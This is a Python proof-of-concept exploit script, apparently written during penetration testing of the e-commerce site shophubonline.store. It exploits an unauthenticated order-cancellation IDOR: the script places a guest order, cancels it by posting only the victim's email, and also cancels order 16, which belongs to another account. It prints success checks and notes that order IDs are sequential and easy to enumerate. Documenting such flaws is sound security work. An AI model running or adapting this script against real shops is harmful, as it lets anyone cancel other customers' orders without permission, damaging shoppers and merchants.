#!/usr/bin/env python3
"""
Security test for AUTHZ-VULN-02: Guest Order Cancellation IDOR
Target: https://shophubonline.store
Vulnerability: POST /api/orders/:id/cancel allows unauthenticated cancellation
of any guest order by providing the victim's email. No auth required.
"""

import requests
import json
import sys

BASE_URL = "https://shophubonline.store"

def print_separator(title):
    print("\n" + "="*60)
    print(f"  {title}")
    print("="*60)

def print_response(label, resp):
    print(f"\n[{label}]")
    print(f"  Status Code : {resp.status_code}")
    try:
        body = resp.json()
        print(f"  Body        : {json.dumps(body, indent=4)}")
    except Exception:
        # PDF or non-JSON
        ct = resp.headers.get("Content-Type", "")
        print(f"  Content-Type: {ct}")
        if "pdf" in ct.lower():
            print(f"  Body        : <PDF binary, {len(resp.content)} bytes>")
        else:
            print(f"  Body        : {resp.text[:500]}")
    return resp

# ---------------------------------------------------------------------------
# Step 1: Create a fresh victim order
# ---------------------------------------------------------------------------
print_separator("STEP 1: Create Fresh Victim Order (victim2@shophub-test.com)")

guest_order_payload = {
    "guestEmail": "victim2@shophub-test.com",
    "shippingAddress": {
        "fullName": "Victim Two",
        "address": "789 Victim Ave, Delhi, DL 110001",
        "phone": "9876543211",
        "city": "Delhi",
        "state": "DL",
        "zipCode": "110001",
        "country": "India"
    },
    "paymentMethod": "cod",
    "items": [{"productId": 24, "quantity": 1}]
}

resp1 = requests.post(
    f"{BASE_URL}/api/orders/guest",
    json=guest_order_payload,
    headers={"Content-Type": "application/json"},
    timeout=30
)
print_response("POST /api/orders/guest", resp1)

try:
    data1 = resp1.json()
    # Try common keys for order ID
    victim2_id = (
        data1.get("order", {}).get("id") or
        data1.get("orderId") or
        data1.get("id") or
        (data1.get("order") or {}).get("_id")
    )
    victim2_status_before = (
        data1.get("order", {}).get("status") or
        data1.get("status") or
        "unknown"
    )
    if not victim2_id:
        print(f"\n  [!] Could not extract order ID from response. Full response:")
        print(f"      {json.dumps(data1, indent=4)}")
        sys.exit(1)
    print(f"\n  [+] VICTIM2_ID     = {victim2_id}")
    print(f"  [+] Status (before) = {victim2_status_before}")
except Exception as e:
    print(f"\n  [!] Failed to parse Step 1 response: {e}")
    sys.exit(1)

# ---------------------------------------------------------------------------
# Step 2: Verify victim order via invoice endpoint (GET PDF)
# ---------------------------------------------------------------------------
print_separator(f"STEP 2: Verify Victim Order Invoice (ID={victim2_id})")

resp2 = requests.get(
    f"{BASE_URL}/api/orders/{victim2_id}/invoice",
    params={"email": "victim2@shophub-test.com"},
    timeout=30
)
print_response(f"GET /api/orders/{victim2_id}/invoice?email=victim2@shophub-test.com", resp2)

if resp2.status_code == 200:
    ct = resp2.headers.get("Content-Type", "")
    if "pdf" in ct.lower():
        print(f"\n  [+] PDF invoice accessible before cancellation (order is active).")
    else:
        print(f"\n  [+] Invoice endpoint returned 200 (Content-Type: {ct}).")
else:
    print(f"\n  [-] Invoice endpoint returned {resp2.status_code} (order may not exist or wrong email).")

# ---------------------------------------------------------------------------
# Step 3: ATTACKER cancels the victim's order
# ---------------------------------------------------------------------------
print_separator(f"STEP 3: ATTACKER Cancels Victim's Order (ID={victim2_id})")

cancel_payload = {
    "email": "victim2@shophub-test.com",
    "reason": "Unauthorized cancellation by attacker - security test"
}

resp3 = requests.post(
    f"{BASE_URL}/api/orders/{victim2_id}/cancel",
    json=cancel_payload,
    headers={"Content-Type": "application/json"},
    timeout=30
)
print_response(f"POST /api/orders/{victim2_id}/cancel (attacker, correct email)", resp3)

exploit_succeeded = False
cancelled_status = None

try:
    data3 = resp3.json()
    cancelled_status = (
        data3.get("order", {}).get("status") or
        data3.get("status") or
        "unknown"
    )
    if resp3.status_code == 200 and "cancel" in str(cancelled_status).lower():
        exploit_succeeded = True
        print(f"\n  [!!!] EXPLOIT SUCCESS: Order status is now '{cancelled_status}'")
    elif resp3.status_code == 200:
        print(f"\n  [+] Got 200, status in response: '{cancelled_status}'")
        exploit_succeeded = True
    else:
        print(f"\n  [-] Cancel returned {resp3.status_code}")
except Exception as e:
    print(f"\n  [!] Could not parse cancel response: {e}")

# ---------------------------------------------------------------------------
# Step 4: Verify cancellation - try invoice again
# ---------------------------------------------------------------------------
print_separator(f"STEP 4: Verify Cancellation via Invoice (ID={victim2_id})")

resp4 = requests.get(
    f"{BASE_URL}/api/orders/{victim2_id}/invoice",
    params={"email": "victim2@shophub-test.com"},
    timeout=30
)
print_response(f"GET /api/orders/{victim2_id}/invoice?email=victim2@shophub-test.com (post-cancel)", resp4)

if resp4.status_code == 200:
    ct = resp4.headers.get("Content-Type", "")
    if "pdf" in ct.lower():
        print(f"\n  [+] PDF still returned — check PDF content for 'cancelled' status.")
    else:
        try:
            d4 = resp4.json()
            post_status = d4.get("order", {}).get("status") or d4.get("status") or "unknown"
            print(f"\n  [+] Post-cancel status from invoice endpoint: '{post_status}'")
        except Exception:
            pass
elif resp4.status_code == 404:
    print(f"\n  [+] Invoice endpoint returned 404 after cancellation (order may be cancelled/gone).")
else:
    print(f"\n  [-] Invoice endpoint returned {resp4.status_code} after cancellation.")

# ---------------------------------------------------------------------------
# Step 5: Test with WRONG email (should be blocked)
# ---------------------------------------------------------------------------
print_separator(f"STEP 5: Wrong Email Test (should return 403/400/404)")

wrong_cancel_payload = {
    "email": "wrong@attacker.com",
    "reason": "test with wrong email"
}

resp5 = requests.post(
    f"{BASE_URL}/api/orders/{victim2_id}/cancel",
    json=wrong_cancel_payload,
    headers={"Content-Type": "application/json"},
    timeout=30
)
print_response(f"POST /api/orders/{victim2_id}/cancel (wrong email)", resp5)

if resp5.status_code in (400, 403, 404):
    print(f"\n  [+] CORRECT: Wrong email properly rejected with {resp5.status_code}.")
else:
    print(f"\n  [!] UNEXPECTED: Wrong email returned {resp5.status_code} — possible additional issue!")

# ---------------------------------------------------------------------------
# Step 6: Demonstrate IDOR across other users — cancel order 16
#         (belongs to victim@shophub-test.com, confirmed processing in prior run)
# ---------------------------------------------------------------------------
print_separator("STEP 6: IDOR Proof — Cancel ANOTHER User's Order (ID=16)")

other_order_payload = {
    "email": "victim@shophub-test.com",
    "reason": "IDOR attack — cancelling another user's order"
}

resp6 = requests.post(
    f"{BASE_URL}/api/orders/16/cancel",
    json=other_order_payload,
    headers={"Content-Type": "application/json"},
    timeout=30
)
print_response("POST /api/orders/16/cancel (victim@shophub-test.com)", resp6)

idor_succeeded = False
try:
    data6 = resp6.json()
    s6 = (
        data6.get("order", {}).get("status") or
        data6.get("status") or
        "unknown"
    )
    if resp6.status_code == 200:
        idor_succeeded = True
        print(f"\n  [!!!] IDOR CONFIRMED: Successfully cancelled order 16 (status: '{s6}')")
    else:
        print(f"\n  [-] Order 16 cancel returned {resp6.status_code} (may already be cancelled)")
except Exception as e:
    print(f"\n  [!] Could not parse IDOR response: {e}")

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
print_separator("SUMMARY")
print(f"  Target              : {BASE_URL}")
print(f"  Vulnerability       : AUTHZ-VULN-02 (Guest Order Cancellation IDOR)")
print(f"  New Victim Order ID : {victim2_id}")
print(f"  Status BEFORE cancel: {victim2_status_before}")
print(f"  Status AFTER cancel : {cancelled_status}")
print(f"  Exploit Succeeded   : {'YES' if exploit_succeeded else 'NO'}")
print(f"  IDOR on Order 16    : {'YES (confirmed)' if idor_succeeded else 'NO / already cancelled'}")
print(f"\n  Attack vector: Unauthenticated POST /api/orders/:id/cancel")
print(f"  with body {{\"email\": \"<victim email>\"}} cancels any guest order.")
print(f"  No session, token, or authentication required.")
print(f"  Order IDs are sequential integers — trivially enumerable.")
print()
